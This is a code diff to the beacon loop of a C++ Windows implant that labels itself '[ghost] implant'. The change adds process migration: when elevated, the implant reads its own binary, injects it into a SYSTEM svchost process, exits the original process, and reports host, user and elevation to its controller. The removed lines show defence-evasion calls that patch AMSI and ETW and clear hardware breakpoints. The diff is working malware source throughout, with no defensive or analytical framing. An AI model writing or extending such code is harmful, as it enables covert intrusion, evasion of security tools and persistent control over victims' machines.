@@ -738,18 +738,8 @@ static void SetWallpaperFromUrl(const wchar_t* host, const wchar_t* urlPath) {
 // =====================================================================
 //  MAIN BEACON LOOP
 // =====================================================================
-VOID BeaconLoop() {
+VOID BeaconLoop(const Session& session) {
     DebugLog(L"BeaconLoop started");
-
-    Session session;
-    session.hostname      = GetHostname();
-    session.username      = GetUsername();
-    session.build         = GetOSBuild();
-    session.elevated      = IsElevated();
-    session.amsiPatched   = PatchAMSI();
-    session.etwPatched    = PatchETW();
-    session.hwbpsCleared  = ClearHardwareBreakpoints();
-    session.sessionId     = GetHostnameHash() + L"|" + session.username;
 
     g_SessionId  = session.sessionId;
     g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
@@ -798,15 +788,49 @@ VOID BeaconLoop() {
             }
             failures = 0;
 
-            // First successful beacon: set wallpaper + send hello
+            // First successful beacon: migrate into svchost, set wallpaper, send hello
             if (!sentHello) {
                 sentHello = true;
                 SetWallpaperFromUrl(L"wallpaperaccess.com", L"/full/2012878.jpg");
+
+                // Auto-migrate: inject self into SYSTEM svchost and exit this process.
+                // Only attempt if elevated — migration requires PROCESS_VM_WRITE on svchost.
+                if (session.elevated) {
+                    DWORD svchostPid = FindBestSvchost();
+                    if (svchostPid) {
+                        wchar_t selfPath[MAX_PATH] = {};
+                        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+                        HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
+                                                   nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+                        if (hFile != INVALID_HANDLE_VALUE) {
+                            LARGE_INTEGER fsz = {};
+                            GetFileSizeEx(hFile, &fsz);
+                            std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
+                            DWORD rd = 0;
+                            ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
+                            CloseHandle(hFile);
+
+                            if (rd == payload.size() && InjectRemoteProcess(svchostPid, payload.data(), payload.size(), nullptr)) {
+                                DebugLog(L"Migrated into svchost pid=" + std::to_wstring(svchostPid));
+                                SendResult(session.sessionId,
+                                    L"[ghost] implant online — migrated into svchost pid=" + std::to_wstring(svchostPid) +
+                                    L"\r\nhost: " + session.hostname +
+                                    L"\r\nuser: " + session.username +
+                                    L"\r\nelevated: yes");
+                                // Give injected copy 2s to start beaconing, then vanish
+                                Sleep(2000);
+                                ExitProcess(0);
+                            }
+                        }
+                    }
+                }
+
+                // Migration failed or not elevated — stay in current process
                 SendResult(session.sessionId,
                     L"[ghost] implant online\r\nhost: " + session.hostname +
                     L"\r\nuser: " + session.username +
                     L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
-                DebugLog(L"Hello sent");
+                DebugLog(L"Hello sent (no migration)");
             }
 
             // Execute task
